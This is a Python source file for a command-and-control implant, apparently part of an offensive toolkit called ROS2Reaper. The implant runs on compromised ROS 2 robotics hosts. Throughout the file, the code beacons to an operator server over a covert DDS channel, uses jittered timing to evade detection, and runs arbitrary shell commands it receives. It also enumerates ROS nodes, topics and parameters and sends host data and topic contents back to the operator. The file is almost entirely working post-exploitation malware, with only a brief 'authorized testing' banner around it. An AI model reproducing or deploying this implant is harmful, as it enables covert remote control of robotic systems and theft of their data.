#!/usr/bin/env python3
"""
c2_beacon.py — C2 Implant / Beacon
=====================================
ROS2Reaper Phase 4 Module

Deployed on a compromised ROS 2 host after initial access. Checks into the
operator C2 server via the covert DDS channel, receives tasking, executes
commands, and returns results. Designed to blend into normal ROS 2 node traffic.

Beacon behavior:
    - Checks in every N seconds (jittered ±25% to defeat timing analysis)
    - Executes operator tasks: shell commands, topic reads, node kills, param dumps
    - Streams results back via the covert channel
    - Self-terminates on KILL signal or after max TTL

Author  : Gh057x
Phase   : 4 — Post-Exploitation / C2
Requires: Python 3.8+ (stdlib only — rclpy optional for richer enumeration)

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import os
import sys
import time
import socket
import threading
import subprocess
import json
import random
from typing import Optional, Dict, Any

from modules.phase4.c2_channel import (
    C2Transport, C2Packet, C2Session,
    MsgType, DEFAULT_KEY, _make_session_id,
)


# ─────────────────────────────────────────────────────────────────────────────
# Task handlers
# ─────────────────────────────────────────────────────────────────────────────

def _handle_shell(cmd: str, timeout: int = 30) -> dict:
    """Execute a shell command and return stdout/stderr."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=timeout
        )
        stdout = result.stdout.decode("utf-8", errors="replace")
        stderr = result.stderr.decode("utf-8", errors="replace")
        return {
            "stdout":     stdout[:4096],
            "stderr":     stderr[:1024],
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"error": "timeout", "stdout": "", "stderr": ""}
    except Exception as e:
        return {"error": str(e)}


def _handle_ros_enum() -> dict:
    """Enumerate ROS 2 graph — uses ros2 CLI if available, falls back to env vars."""
    info: Dict[str, Any] = {"method": "cli"}
    try:
        nodes   = subprocess.run(["ros2", "node", "list"],   capture_output=True, text=True, timeout=10)
        topics  = subprocess.run(["ros2", "topic", "list"],  capture_output=True, text=True, timeout=10)
        params  = subprocess.run(["ros2", "param", "list"],  capture_output=True, text=True, timeout=10)
        info["nodes"]  = nodes.stdout.strip().splitlines()
        info["topics"] = topics.stdout.strip().splitlines()
        info["params"] = params.stdout.strip().splitlines()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        info["method"] = "env"
        info["ROS_DISTRO"]      = os.environ.get("ROS_DISTRO", "unknown")
        info["ROS_DOMAIN_ID"]   = os.environ.get("ROS_DOMAIN_ID", "0")
        info["AMENT_PREFIX_PATH"] = os.environ.get("AMENT_PREFIX_PATH", "")
    return info


def _handle_sysinfo() -> dict:
    """Collect basic system info from the compromised host."""
    return {
        "hostname":  socket.gethostname(),
        "platform":  sys.platform,
        "pid":       os.getpid(),
        "user":      os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "ros_distro": os.environ.get("ROS_DISTRO", "none"),
        "domain_id": os.environ.get("ROS_DOMAIN_ID", "0"),
        "cwd":       os.getcwd(),
        "path":      os.environ.get("PATH", ""),
    }


def _handle_topic_read(topic: str, count: int = 1) -> dict:
    """Read messages from a ROS 2 topic via CLI.
    Runs for up to 8 seconds and returns whatever was captured — works across
    ROS distros that may not support --once (e.g. Galactic).
    """
    try:
        result = subprocess.run(
            ["ros2", "topic", "echo", topic],
            capture_output=True, timeout=8,
        )
        stdout = result.stdout.decode("utf-8", errors="replace")
        stderr = result.stderr.decode("utf-8", errors="replace")
        return {"topic": topic, "data": stdout[:4096], "stderr": stderr[:256]}
    except subprocess.TimeoutExpired as e:
        # Normal exit path — process killed after timeout, use partial output
        stdout = (e.stdout or b"").decode("utf-8", errors="replace")
        return {"topic": topic, "data": stdout[:4096]}
    except Exception as e:
        return {"topic": topic, "error": str(e)}


TASK_HANDLERS = {
    "shell":     lambda p: _handle_shell(p.get("cmd", "id")),
    "sysinfo":   lambda p: _handle_sysinfo(),
    "ros_enum":  lambda p: _handle_ros_enum(),
    "topic_read": lambda p: _handle_topic_read(p.get("topic", "/rosout"), p.get("count", 1)),
}


# ─────────────────────────────────────────────────────────────────────────────
# Beacon
# ─────────────────────────────────────────────────────────────────────────────

class C2Beacon:
    """
    Implant that runs on a compromised ROS 2 host.

    Checks in with the operator C2 server at `c2_ip` over the covert DDS
    channel. On each check-in it delivers any pending task results and receives
    new tasking.
    """

    def __init__(
        self,
        c2_ip:        str,
        domain_id:    int  = 0,
        interval:     float = 30.0,
        jitter:       float = 0.25,
        key:          bytes = DEFAULT_KEY,
        max_ttl:      int   = 0,
        verbose:      bool  = False,
    ):
        self.c2_ip      = c2_ip
        self.interval   = interval
        self.jitter     = jitter
        self.verbose    = verbose
        self.max_ttl    = max_ttl       # 0 = run forever
        self.session_id = _make_session_id()
        self.transport  = C2Transport(domain_id=domain_id, key=key)
        # Beacon listens on participant_id=1 port to avoid colliding with the
        # server which listens on participant_id=0 (needed for loopback testing)
        self.reply_port = self.transport._user_port(participant_id=1)
        self._stop      = threading.Event()
        self._seq       = 0
        self._pending_results: list = []

    # ── internal helpers ──────────────────────────────────────────────────────

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"[beacon:{self.session_id[:6]}] {msg}")

    def _next_seq(self) -> int:
        self._seq += 1
        return self._seq

    def _sleep_interval(self) -> None:
        jit  = self.interval * self.jitter
        wait = self.interval + random.uniform(-jit, jit)
        self._log(f"sleeping {wait:.1f}s")
        self._stop.wait(wait)

    def _send(self, msg_type: int, payload: dict) -> bool:
        pkt = C2Packet(
            msg_type   = msg_type,
            session_id = self.session_id,
            seq        = self._next_seq(),
            timestamp  = time.time(),
            payload    = payload,
        )
        return self.transport.send_unicast(self.c2_ip, pkt)

    # ── check-in ─────────────────────────────────────────────────────────────

    def _checkin(self) -> Optional[C2Packet]:
        """Send a BEACON packet. Returns any tasking packet received in reply."""
        # Start listener BEFORE sending the beacon — on loopback the server
        # replies almost instantly and the packet would arrive before the socket
        # is bound if we started the thread after sending.
        tasking: list = []
        stop_listen = threading.Event()

        def _collect(pkt: C2Packet, src_ip: str) -> None:
            if pkt.session_id == self.session_id and pkt.msg_type == MsgType.TASK:
                tasking.append(pkt)
                stop_listen.set()

        t = threading.Thread(
            target=self.transport.listen,
            args=(self.reply_port, _collect, stop_listen, False),
            daemon=True,
        )
        t.start()
        time.sleep(0.05)  # let the socket bind before we send

        info = _handle_sysinfo()
        info["results"]    = self._pending_results
        info["reply_port"] = self.reply_port
        self._pending_results = []

        ok = self._send(MsgType.BEACON, info)
        self._log(f"check-in {'ok' if ok else 'failed'}")

        stop_listen.wait(timeout=5.0)
        stop_listen.set()

        return tasking[0] if tasking else None

    # ── task execution ────────────────────────────────────────────────────────

    def _execute(self, task_pkt: C2Packet) -> None:
        task_type = task_pkt.payload.get("task")
        self._log(f"executing task: {task_type}")

        handler = TASK_HANDLERS.get(task_type)
        if handler:
            result = handler(task_pkt.payload)
        else:
            result = {"error": f"unknown task: {task_type}"}

        self._pending_results.append({
            "task":      task_type,
            "task_seq":  task_pkt.seq,
            "result":    result,
            "ts":        time.time(),
        })

    # ── main loop ─────────────────────────────────────────────────────────────

    def run(self) -> None:
        self._log(f"starting — c2={self.c2_ip} interval={self.interval}s")
        checkins = 0

        while not self._stop.is_set():
            task_pkt = self._checkin()
            checkins += 1

            if task_pkt:
                if task_pkt.msg_type == MsgType.KILL:
                    self._log("received KILL — shutting down")
                    break
                self._execute(task_pkt)

            if self.max_ttl and checkins >= self.max_ttl:
                self._log("max TTL reached — shutting down")
                break

            self._sleep_interval()

        self._log("stopped")

    def stop(self) -> None:
        self._stop.set()


# ─────────────────────────────────────────────────────────────────────────────
# Entry point (standalone deploy)
# ─────────────────────────────────────────────────────────────────────────────

def run_beacon(
    c2_ip:     str,
    domain_id: int   = 0,
    interval:  float = 30.0,
    key:       bytes = DEFAULT_KEY,
    max_ttl:   int   = 0,
    verbose:   bool  = False,
) -> None:
    beacon = C2Beacon(
        c2_ip     = c2_ip,
        domain_id = domain_id,
        interval  = interval,
        key       = key,
        max_ttl   = max_ttl,
        verbose   = verbose,
    )
    try:
        beacon.run()
    except KeyboardInterrupt:
        beacon.stop()
